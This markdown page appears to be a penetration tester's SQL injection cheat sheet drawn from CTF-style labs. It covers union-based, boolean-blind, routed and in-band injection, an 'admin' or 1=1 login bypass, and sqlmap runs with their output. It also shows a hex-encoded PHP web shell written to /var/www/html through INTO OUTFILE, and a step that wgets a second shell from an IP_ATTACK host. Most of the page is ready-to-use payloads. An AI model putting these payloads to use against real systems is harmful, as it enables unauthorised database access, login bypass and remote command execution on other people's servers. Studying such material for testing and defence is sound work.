---
title: SQLi 💉
---
## Entry point detection

```sql
'
"
`
')
")
`)
'))
"))
`))
```

## Union based

### Union Select

```sql
ID union select 1,2,3,4
' union select 1, @@version-- -
' union select 1, table_name FROM information_schema.tables-- -
```

### Union Group By / Order

```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False -> query is only using 3 columns
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False -> query is only using 3 columns
```

## Upload webshell

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";?>` traduces in `0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E` in hex format:
[Reverse shells 👾](reverse_shells.md)
```sql
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -
```

- If you get an error, the query has been executed correctly. Now check `/shell.php`
- Now, to gain a full shell, you can just upload one and then calling it like:
	- Create the shell (check [Reverse shells 👾](reverse_shells.md))
	- Create python web server
	- Download it from the browser: `http://domain.com/shell.php?cmd=wget http://IP_ATTACK:PORT/sexyshell.php`
	- Call it: `http://domain.com/sexyshell.php`

## Bypass a login

- You can try: 

```sql
username: admin' or 1=1-- -

password: whatever
```

## Storing location

- A common way to try to influence on our IP address via HTTP is to use the `X-Forwarded-For` header. We can directly set an injection point in this header:

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL
```

- The result might look like this:

```shell
sqlmap identified the following injection point(s) with a total of 2254 HTTP(s) requests:
---
Parameter: X-Forwarded-For #1* ((custom) HEADER)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: 10.11.75.136';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 10.11.75.136' AND (SELECT 8527 FROM (SELECT(SLEEP(5)))ACZe)-- jhGF
---
```

==Now go to the **Sqlmap** note to follow.==

## Boolean-based Blind

- When introducing a username to register and the app says if it is available or not, we can analyze the traffic and evaluate an API request:

![](Pasted%20image%2020240323224232.png)

- The request looks like this and returns a boolean in JSON:

```shell
curl "http://10.10.115.157/register/user-check?username=gitblanc" -s | jq
# returns:
{  
  "available": true  
}
# A username that is in use:
curl "http://10.10.115.157/register/user-check?username=admin" -s | jq
# returns:
{
  "available": false
}
```

- So we can try for:

```shell
curl "http://10.10.115.157/register/user-check?username=gitblanc' OR 1=2-- -" -s | jq
# returns:
{  
  "available": true  
}
curl "http://10.10.115.157/register/user-check?username=gitblanc' OR 1=1-- -" -s | jq
# returns:
{  
  "available": false  
}
curl "http://10.10.115.157/register/user-check?username=admin' OR 1=2-- -" -s | jq
# returns:
{  
  "available": true  
}
curl "http://10.10.115.157/register/user-check?username=admin' OR 1=1-- -" -s | jq
# returns:
{  
  "available": false  
}
```

- Try it with sqlmap: 

```shell
sqlmap -u 'http://domain.com/register/user-check?username=gitblanc' -p username --risk 3 --level 5 --dbms MySQL
```

## Routed SQLi

> **Routed SQL Injection** can be In-band, Inferential or Out-of-band. It is a special kind of SQLi attack where the injectable query is not the one which is leaking the data but the output of this query is the input of another query that is giving the final data leakage.
> 
The following piece of PHP code from _Zenodermus Javanicus_ illustrates how the vulnerability can be implemented on the server-side.

```php
<?php   
$id = $_GET['id'];  
$query = "SELECT id,sec_code FROM users WHERE id='$id'";  
  
if (!$result = mysql_query($query, $conn)) die("Error While Selection process : " . mysql_error());  
  
if (mysql_num_rows($result) == 0) die();  
$row = mysql_fetch_array($result, MYSQL_ASSOC);  
$query = "SELECT username FROM users WHERE sec_code='" . $row['sec_code'] . "'";  
echo "<br /><font color=red>This is the query which gives you Output : </font>$query<br /><br />";  
  
if (!$result = mysql_query($query, $conn)) die("Error While Selection process : " . mysql_error());  
  
if (mysql_num_rows($result) == 0) die("Invalid Input parameter");  
$row = mysql_fetch_array($result, MYSQL_ASSOC);  
echo 'Username is : ' . $row['username'] . "<br />"; ?>
```

>First, a classical SQLi attack can be conducted to deduce the number of columns of the first query.
>
Then, the first part of the first query need to be voided with something like `and false` or `and 1=0` so this will output 0 rows. Using `UNION SELECT` in the second part of the first query will allow to control the output.
>
>Example of payload:

```sql
?user=john' AND FALSE UNION SELECT 1,2,3-- -
```

>But instead of injecting dummy data in the second query, it is needed to encode the nested payload as hexadecimal to carry it.
>
>Example of payload:

```sql
?user=john' AND FALSE UNION SELECT 1,0x220756e696f6e2073656c65637420757365722c70617373776f72642d2d202d,3-- -
```

>It is needed to encode the nested payload to avoid it interfering with the root query. The goal is to use `UNION SELECT` in the first query to display a SQL payload as an input of the second query. So the decoded version of `0x220756e696f6e2073656c65637420757365722c70617373776f72642d2d202d` (`' union select user,password-- -`) will be injected in the second query. Routing the payload from a query to another.

- With the following payload, we are able to detect which columns are reflected:

```sql
2 union all select 'gitblanc','is','sexy' from users-- -
```

![](Pasted%20image%2020240323231230.png)

- So now, we can try to replace `gitblanc` or `is` with a SQL query.
- With the nested payload we can find which columns is reflected:

```sql
2 union all select '44 UNION SELECT 5,6,7,8-- -','is','sexy' from users-- -
```

![](Pasted%20image%2020240323231506.png)

- So now, we replace the nested to select the flag (now you could list tables and columns in a real scenario):

```sql
2 union all select '44 UNION SELECT 5,flag,7,8 from flag-- -','is','sexy' from users-- -
```

![](Pasted%20image%2020240323231734.png)

## In-band SQLi

- If you try a Union select attack like: `33 UNION SELECT 1,2,3,4` and you get an output like:

![](Pasted%20image%2020240323232050.png)

- Now you know that you have an **In-Band SQLi**
- ==Now list the databases with Sqlmap==